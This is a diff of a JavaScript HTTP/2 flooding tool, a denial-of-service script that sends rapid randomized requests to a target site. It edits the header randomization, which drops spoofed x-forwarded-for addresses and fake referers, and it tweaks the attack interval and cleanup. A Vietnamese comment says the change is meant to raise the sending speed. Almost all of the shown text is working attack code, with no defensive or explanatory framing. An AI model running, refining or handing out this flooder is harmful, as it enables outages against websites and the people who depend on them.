@@ -65,22 +65,8 @@ const userAgents = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15"
 ];
 
-const accept_header = [
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-    "application/json, text/plain, */*"
-];
+const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"];
 const encoding_header = ["gzip, deflate, br"];
-const sec_fetch_headers = {
-    "sec-fetch-dest": ["document", "script"],
-    "sec-fetch-mode": ["navigate", "cors"],
-    "sec-fetch-site": ["same-origin", "cross-site"]
-};
-const cache_control = ["no-cache"];
-const referers = [
-    `https://${parsedTarget.host}/`,
-    "https://www.google.com/",
-    ""
-];
 
 const ciphers = [
     "TLS_AES_128_GCM_SHA256",
@@ -145,15 +131,15 @@ const Socker = new NetSocket();
 function generateDynamicPath() {
     const basePath = parsedTarget.path === "/" ? "" : parsedTarget.path;
     const queries = [
-        `q=${encodeURIComponent(randstr(6))}`,
+        `q=${randstr(6)}`,
         `id=${randomIntn(1000, 9999)}`,
-        `p=${randomIntn(1, 10)}`
+        `t=${randstr(8)}`
     ];
     return `${basePath}?${randomElement(queries)}`;
 }
 
 function generateDynamicHeaders() {
-    const headers = {
+    return {
         ":method": "GET",
         ":authority": parsedTarget.host,
         ":path": generateDynamicPath(),
@@ -161,14 +147,9 @@ function generateDynamicHeaders() {
         "user-agent": randomElement(userAgents),
         "accept": randomElement(accept_header),
         "accept-encoding": randomElement(encoding_header),
-        "sec-fetch-dest": randomElement(sec_fetch_headers["sec-fetch-dest"]),
-        "sec-fetch-mode": randomElement(sec_fetch_headers["sec-fetch-mode"]),
-        "sec-fetch-site": randomElement(sec_fetch_headers["sec-fetch-site"]),
-        "cache-control": randomElement(cache_control),
-        "referer": randomElement(referers),
-        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`
+        "connection": "keep-alive",
+        "cache-control": "no-cache"
     };
-    return headers;
 }
 
 function runFlooder() {
@@ -206,19 +187,16 @@ function runFlooder() {
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
-                headerTableSize: 65536,
                 maxConcurrentStreams: 100,
-                initialWindowSize: 6291456,
-                maxHeaderListSize: 65536
+                initialWindowSize: 6291456
             },
             createConnection: () => tlsConn
         });
 
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
-                const dynHeaders = generateDynamicHeaders();
                 for (let i = 0; i < args.Rate; i++) {
-                    const request = client.request(dynHeaders);
+                    const request = client.request(generateDynamicHeaders());
                     request.on("response", () => {
                         request.close();
                         request.destroy();
@@ -229,8 +207,13 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, 0);
-            setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
+            }, 10); // Giảm độ trễ để tăng tốc độ gửi
+            setTimeout(() => {
+                clearInterval(IntervalAttack);
+                client.destroy();
+                tlsConn.destroy();
+                connection.destroy();
+            }, args.time * 1000);
         });
 
         client.on("error", () => {
